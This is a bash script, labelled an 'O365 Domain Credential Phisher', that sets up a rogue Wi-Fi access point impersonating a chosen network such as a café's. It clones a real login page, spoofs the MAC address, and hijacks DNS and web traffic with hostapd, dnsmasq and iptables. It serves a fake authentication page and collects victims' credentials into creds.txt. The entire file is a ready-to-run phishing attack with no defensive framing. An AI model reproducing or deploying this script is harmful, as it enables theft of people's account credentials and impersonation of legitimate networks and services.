#!/bin/bash/
# Color variables
red='\033[0;31m'
green='\033[0;32m'
yellow='\033[0;33m'
blue='\033[0;34m'
magenta='\033[0;35m'
cyan='\033[0;36m'
# Clear the color after that
clear='\033[0m'
cat << "EOF"
   ___ ____    __ _____   _____                        _                               
  / _ \___ \  / /| ____| |  __ \                      (_)                              
 | | | |__) |/ /_| |__   | |  | | ___  _ __ ___   __ _ _ _ __                          
 | | | |__ <| '_ \___ \  | |  | |/ _ \| '_ ` _ \ / _` | | '_ \                         
 | |_| |__) | (_) |__) | | |__| | (_) | | | | | | (_| | | | | |                        
  \___/____/ \___/____/  |_____/ \___/|_| |_| |_|\__,_|_|_| |_|                        
   _____              _            _   _       _   _____  _     _     _                
  / ____|            | |          | | (_)     | | |  __ \| |   (_)   | |               
 | |     _ __ ___  __| | ___ _ __ | |_ _  __ _| | | |__) | |__  _ ___| |__   ___ _ __  
 | |    | '__/ _ \/ _` |/ _ \ '_ \| __| |/ _` | | |  ___/| '_ \| / __| '_ \ / _ \ '__| 
 | |____| | |  __/ (_| |  __/ | | | |_| | (_| | | | |    | | | | \__ \ | | |  __/ |    
  \_____|_|  \___|\__,_|\___|_| |_|\__|_|\__,_|_| |_|    |_| |_|_|___/_| |_|\___|_|    
EOF
echo ""
echo -e ${green}"Which interface do you want to use as your AP NIC? Example: wlan1"${clear}
echo ""
read AP
sleep 1
echo ""
echo -e ${yellow}"Using $AP as your AP interface"${clear}
echo ""
echo -e ${green}"What is the Wifi network you want to spoof? Example: Starbucks Corporate Wifi"${clear}
echo ""
read SSID
sleep 1
echo ""
echo -e ${yellow}"Using $SSID as your spoofed network"${clear}
sleep 1
echo ""
echo -e ${green}"What is the domain you want to spoof on your network? Example: starbucks.com"${clear}
echo ""
read domain
sleep 1
echo ""
echo -e ${yellow}"Using $domain as your spoofed domain"${clear}
sleep 1
echo ""
echo -e ${green}"Enter Website URL To Clone. Example: https://www.starbucks.com"${clear}
echo ""
read URL
echo -e ${yellow}"Cloning $URL"${clear}
echo ""
systemctl stop dnsmasq
/usr/bin/chromium-browser --no-sandbox 2>/dev/null
runuser -u pi -- ./SingleFile/cli/single-file $URL --browser-executable-path=/usr/bin/chromium-browser /home/pi/index.html
echo ""
echo ${yellow}"Cloning finished"${clear}
echo ""
sleep 1
echo -e ${yellow}"$URL Cloned Successfully"${clear}
sleep 2

#Copying Resources To Local Directory

cp Resources/hosts . 2>/dev/null
#cp Resources/dnsmasq.conf . 2>/dev/null
cp Resources/hostapd.conf . 2>/dev/null
cp Resources/index.html . 2>/dev/null
cp Resources/authenticate.html . 2>/dev/null
cp Resources/post.php . 2>/dev/null

#Replacing Variables In Files
sed -i "s/domain/${domain}g/" post.php
sed -i "s/domain/${domain}/g" index.html
#sed -i "s/domain/${domain}/g" dnsmasq.conf
sed -i "s/AP/${AP}/g" hostapd.conf
sed -i "s/SSID/${SSID}/g" hostapd.conf
sed -i "s/domain/${domain}/g" authenticate.html
sed -i "s/domain/${domain}/g" hosts

#Replaceing Resources
rm /etc/hostapd/hostapd.conf 2>/dev/null
mv hostapd.conf /etc/hostapd/hostapd.conf
mv index.html /var/www/html/redirect/
mv authenticate.html /var/www/html/
mv post.php /var/www/html/
mv hosts /etc/hosts

echo ""
sleep 1
echo -e ${green}"Moving Your Index.html File Into Apache"${clear}
echo ""
mv /home/pi/index.html /var/www/html/index.html
echo -e ${green}"Starting Apache"${clear}
service apache2 start
sleep 1
echo ""
echo -e ${green}"Changing $AP MAC Address"${clear}
echo ""
ifconfig $AP down
macchanger -A $AP
sleep 1
ifconfig $AP up
sleep 1
echo ""
echo -e ${green}"Configuring $AP Into An Access Point"${clear}
echo ""
hostapd -B /etc/hostapd/hostapd.conf
sleep 2
echo ""
echo -e ${green}"Bringing Up The Bridge"${clear}
echo ""
ifconfig br0 up
sleep 2
ifconfig br0 10.1.1.1 netmask 255.255.255.0
sysctl net.ipv4.ip_forward=1
echo ""
echo -e ${green}"Copying Redirect Into Cloned Page"${clear}
echo ""
echo "<meta http-equiv="refresh" content=2;URL='http://${domain}/authenticate.html'>">> /var/www/html/index.html
echo -e ${green}"Setting IPTables"${clear}
iptables --flush
iptables -t nat --flush
iptables -t nat -A PREROUTING -i br0 -p udp -m udp --dport 53 -j DNAT --to-destination 10.1.1.1:53
iptables -t nat -A PREROUTING -i br0 -p tcp -m tcp --dport 80 -j DNAT --to-destination 10.1.1.1:80
iptables -t nat -A PREROUTING -i br0 -p tcp -m tcp --dport 443 -j DNAT --to-destination 10.1.1.1:443
iptables -t nat -A POSTROUTING -j MASQUERADE
sleep 2
echo ""
echo -e ${green}"Starting Rouge DNS"${clear}
service dnsmasq start
sleep 4
echo ""
echo -e ${red}"Access Point Should Be Up. Watch /var/www/html/creds.txt For Creds"${clear}
echo ""
